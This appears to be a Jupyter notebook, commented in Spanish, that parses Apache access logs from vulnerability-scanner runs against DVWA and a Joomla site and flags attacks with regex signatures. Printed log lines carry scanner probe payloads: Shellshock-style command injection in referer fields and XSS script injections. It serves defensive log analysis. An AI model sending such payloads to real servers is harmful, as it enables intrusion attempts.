      "\"192.168.4.164 - - [22/Dec/2023:15:21:16 +0300] \"GET /DVWA/dvwa/?C=N;O=D HTTP/1.1\" 200 729 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000585)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:16 +0300] \"GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1\" 200 1250 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:21:19 +0300] \"GET /DVWA/vulnerabilities/view_source.php?id=exec&security=low HTTP/1.1\" 200 1301 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:22:38 +0300] \"GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1\" 200 1250 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0005F0)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:23:07 +0300] \"GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1\" 200 1250 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0005F1)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:23:48 +0300] \"GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1\" 200 1250 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0005F6)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:24:12 +0300] \"GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1\" 200 1251 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0005F7)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:33:26 +0300] \"POST /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1714 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:33:51 +0300] \"POST /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1817 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:35:03 +0300] \"GET /DVWA/vulnerabilities/brute/include.php HTTP/1.1\" 404 529 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:35:03 +0300] \"GET /DVWA/vulnerabilities/brute/include.php HTTP/1.1\" 404 529 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000626)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:35:03 +0300] \"GET /DVWA/vulnerabilities/brute/include.php HTTP/1.1\" 404 529 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000627)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:35:03 +0300] \"GET /DVWA/vulnerabilities/brute/include.php HTTP/1.1\" 404 529 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000624)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:35:03 +0300] \"GET /DVWA/vulnerabilities/brute/include.php HTTP/1.1\" 404 529 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000625)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:25 +0300] \"GET /index.php?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)&option=com_search HTTP/1.1\" 200 3147 \"http://www.acunetix-referrer.com/javascript:domxssExecutionSink(0,\\\"'\\\\\\\"><xsstag>()refdxss\\\")\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:08 +0300] \"GET /cgi-sys/entropybanner.cgi HTTP/1.1\" 404 516 \"() { Referer; }; echo -e \\\"Content-Type: text/plain\\\\n\\\"; echo -e \\\"\\\\0141\\\\0143\\\\0165\\\\0156\\\\0145\\\\0164\\\\0151\\\\0170\\\\0163\\\\0150\\\\0145\\\\0154\\\\0154\\\\0163\\\\0150\\\\0157\\\\0143\\\\0153\\\"\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:09 +0300] \"GET  HTTP/1.1\" 400 300 \"-\" \"-\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:07 +0300] \"GET / HTTP/1.1\" 200 3358 \"() { Referer; }; echo -e \\\"Content-Type: text/plain\\\\n\\\"; echo -e \\\"\\\\0141\\\\0143\\\\0165\\\\0156\\\\0145\\\\0164\\\\0151\\\\0170\\\\0163\\\\0150\\\\0145\\\\0154\\\\0154\\\\0163\\\\0150\\\\0157\\\\0143\\\\0153\\\"\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:08 +0300] \"GET /cgi-sys/domainredirect.cgi HTTP/1.1\" 404 517 \"() { Referer; }; echo -e \\\"Content-Type: text/plain\\\\n\\\"; echo -e \\\"\\\\0141\\\\0143\\\\0165\\\\0156\\\\0145\\\\0164\\\\0151\\\\0170\\\\0163\\\\0150\\\\0145\\\\0154\\\\0154\\\\0163\\\\0150\\\\0157\\\\0143\\\\0153\\\"\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:26 +0300] \"GET /index.php/component/users/?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22) HTTP/1.1\" 200 2822 \"http://www.acunetix-referrer.com/javascript:domxssExecutionSink(0,\\\"'\\\\\\\"><xsstag>()refdxss\\\")\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\"\"\n",
      "\"192.168.4.25 - - [22/Dec/2022:16:18:07 +0300] \"GET /admin.cgi HTTP/1.1\" 404 500 \"() { Referer; }; echo -e \\\"Content-Type: text/plain\\\\n\\\"; echo -e \\\"\\\\0141\\\\0143\\\\0165\\\\0156\\\\0145\\\\0164\\\\0151\\\\0170\\\\0163\\\\0150\\\\0145\\\\0154\\\\0154\\\\0163\\\\0150\\\\0157\\\\0143\\\\0153\\\"\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\"\"\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\maria\\AppData\\Local\\Temp\\ipykernel_16564\\3790000002.py:2: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(df_invalid.iloc[i][0])\n"
     ]
    }
   ],
   "source": [
    "for i in range(1, 231):\n",
    "    print(df_invalid.iloc[i][0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Leemos las instancias diferentes a parte, exceptuando el referer que es lo que genera que no concuerde el patron"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Líneas no coincidentes: 1\n"
     ]
    }
   ],
   "source": [
    "pattern = r'^\"(\\S+) (\\S+) (\\S+) \\[(.*?)\\] \"(\\S+) (\\S+) (\\S+)\" (\\d+) (\\d+)'\n",
    "\n",
    "valid_data = []\n",
    "invalid_data = []\n",
    "\n",
    "for index, row in df_invalid.iterrows():\n",
    "    log_line = row['Invalid Lines']\n",
    "    matches = re.match(pattern, log_line)\n",
    "    if matches:\n",
    "        # Si hay coincidencia con el patrón, agregar a datos válidos hasta 'bytes_sent'\n",
    "        client_ip, ident, auth, timestamp, method, request, hhtp_version, status_code, bytes_sent = matches.groups()\n",
    "        valid_data.append([client_ip, ident, auth, timestamp, method, request, hhtp_version, status_code, bytes_sent])\n",
    "    else:\n",
    "        # Si no hay coincidencia, agregar a datos inválidos\n",
    "        invalid_data.append([log_line.strip()])\n",
    "\n",
    "df_invalid_reduced = pd.DataFrame(valid_data, columns=['Client IP', 'Ident', 'Auth', 'Timestamp', 'Method', 'Request', 'HTTP Version', 'Status Code', 'Bytes Sent'])\n",
    "\n",
    "print(\"Líneas no coincidentes:\", len(invalid_data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:14 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>225</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:18:08 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/cgi-sys/entropybanner.cgi</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>516</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>226</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:18:07 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>3358</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>227</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:18:08 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/cgi-sys/domainredirect.cgi</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>517</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>228</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:18:26 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php/component/users/?wvstest=javascript...</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>2822</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>229</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:18:07 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/admin.cgi</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>500</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>230 rows × 9 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "         Client IP Ident Auth                   Timestamp Method  \\\n",
       "0    192.168.4.164     -    -  22/Dec/2023:15:19:14 +0300    GET   \n",
       "1    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "2    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "3    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "4    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "..             ...   ...  ...                         ...    ...   \n",
       "225   192.168.4.25     -    -  22/Dec/2022:16:18:08 +0300    GET   \n",
       "226   192.168.4.25     -    -  22/Dec/2022:16:18:07 +0300    GET   \n",
       "227   192.168.4.25     -    -  22/Dec/2022:16:18:08 +0300    GET   \n",
       "228   192.168.4.25     -    -  22/Dec/2022:16:18:26 +0300    GET   \n",
       "229   192.168.4.25     -    -  22/Dec/2022:16:18:07 +0300    GET   \n",
       "\n",
       "                                               Request HTTP Version  \\\n",
       "0                                               /DVWA/     HTTP/1.1   \n",
       "1                                               /DVWA/     HTTP/1.1   \n",
       "2                                               /DVWA/     HTTP/1.1   \n",
       "3                                               /DVWA/     HTTP/1.1   \n",
       "4                                               /DVWA/     HTTP/1.1   \n",
       "..                                                 ...          ...   \n",
       "225                         /cgi-sys/entropybanner.cgi     HTTP/1.1   \n",
       "226                                                  /     HTTP/1.1   \n",
       "227                        /cgi-sys/domainredirect.cgi     HTTP/1.1   \n",
       "228  /index.php/component/users/?wvstest=javascript...     HTTP/1.1   \n",
       "229                                         /admin.cgi     HTTP/1.1   \n",
       "\n",
       "    Status Code Bytes Sent  \n",
       "0           200       1964  \n",
       "1           200       1964  \n",
       "2           200       1964  \n",
       "3           200       1964  \n",
       "4           200       1964  \n",
       "..          ...        ...  \n",
       "225         404        516  \n",
       "226         200       3358  \n",
       "227         404        517  \n",
       "228         200       2822  \n",
       "229         404        500  \n",
       "\n",
       "[230 rows x 9 columns]"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_invalid_reduced"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1. Detección de ataques en base a su referer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total attacks detected: 841\n",
      "                                                   log          attack\n",
      "0    \"192.168.4.164 - - [22/Dec/2023:15:19:14 +0300...      XSS Attack\n",
      "1    \"192.168.4.164 - - [22/Dec/2023:15:19:14 +0300...      XSS Attack\n",
      "2    \"192.168.4.164 - - [22/Dec/2023:15:19:14 +0300...      XSS Attack\n",
      "3    \"192.168.4.164 - - [22/Dec/2023:15:19:14 +0300...      XSS Attack\n",
      "4    \"192.168.4.164 - - [22/Dec/2023:15:19:15 +0300...      XSS Attack\n",
      "..                                                 ...             ...\n",
      "836  \"192.168.4.25 - - [22/Dec/2022:16:36:02 +0300]...  Path Traversal\n",
      "837  \"192.168.4.25 - - [22/Dec/2022:16:35:38 +0300]...  Path Traversal\n",
      "838  \"192.168.4.25 - - [22/Dec/2022:16:19:38 +0300]...  Path Traversal\n",
      "839  \"192.168.4.25 - - [22/Dec/2022:16:31:03 +0300]...  Path Traversal\n",
      "840  \"192.168.4.25 - - [22/Dec/2022:16:18:53 +0300]...  Path Traversal\n",
      "\n",
      "[841 rows x 2 columns]\n"
     ]
    }
   ],
   "source": [
    "# Definir las firmas para detección de ataques\n",
    "signatures = {\n",
    "    \"SQL Injection\": re.compile(r'.*UNION SELECT.*', re.IGNORECASE),\n",
    "    \"XSS Attack\": re.compile(r'.*(%3C|<)script(%3E|>).*', re.IGNORECASE),\n",
    "    \"Path Traversal\": re.compile(r'.*\\.\\./.*', re.IGNORECASE),\n",
    "}\n",
    "\n",
    "# Función para detectar ataques en una línea de log\n",
    "def detect_attack(log_line):\n",
    "    for attack_name, pattern in signatures.items():\n",
    "        if pattern.search(log_line):\n",
    "            return attack_name\n",
    "    return None\n",
    "\n",
    "# Ruta a tu archivo de logs de Apache\n",
    "log_file = '../Datos/Originales/apache-logs.txt'  # Actualiza esto con la ruta real a tu archivo de logs\n",
    "\n",
    "# Lista para almacenar los registros con ataques detectados\n",
    "detected_attacks = []\n",
    "\n",
    "# Leer y analizar cada línea del archivo de logs\n",
    "with open(log_file, \"r\") as file:\n",
    "    for line in file:\n",
    "        attack = detect_attack(line)\n",
    "        if attack:\n",
    "            detected_attacks.append({\"log\": line.strip(), \"attack\": attack})\n",
    "\n",
    "# Convertir la lista de ataques detectados a un DataFrame de pandas\n",
    "attacks_df = pd.DataFrame(detected_attacks)\n",
    "\n",
    "# Mostrar el número de ataques detectados y el DataFrame resultante\n",
    "print(f\"Total attacks detected: {len(attacks_df)}\")\n",
    "print(attacks_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2. Análisis exploratorio"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Duplicidades"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Df válido"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>Referrer</th>\n",
       "      <th>User Agent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/wc.db</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/~.aspx</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/cgi-bin/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13591</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:38:55 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/users/?task=registration....</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>237</td>\n",
       "      <td>http://192.168.4.161/DVWA</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13595</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:27:03 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>3053</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13613</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:29:16 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/administrator/index.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>500</td>\n",
       "      <td>1522</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13617</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:22:11 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>303</td>\n",
       "      <td>376</td>\n",
       "      <td>http://192.168.4.161/DVWA</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13621</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:20:55 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>303</td>\n",
       "      <td>363</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>2577 rows × 11 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "           Client IP Ident Auth                   Timestamp Method  \\\n",
       "3      192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "5      192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "7      192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "9      192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "11     192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "...              ...   ...  ...                         ...    ...   \n",
       "13591   192.168.4.25     -    -  22/Dec/2022:16:38:55 +0300   POST   \n",
       "13595   192.168.4.25     -    -  22/Dec/2022:16:27:03 +0300   POST   \n",
       "13613   192.168.4.25     -    -  22/Dec/2022:16:29:16 +0300   POST   \n",
       "13617   192.168.4.25     -    -  22/Dec/2022:16:22:11 +0300   POST   \n",
       "13621   192.168.4.25     -    -  22/Dec/2022:16:20:55 +0300   POST   \n",
       "\n",
       "                                                 Request HTTP Version  \\\n",
       "3                                      /DVWA/.git/config     HTTP/1.1   \n",
       "5                                 /DVWA/.svn/all-wcprops     HTTP/1.1   \n",
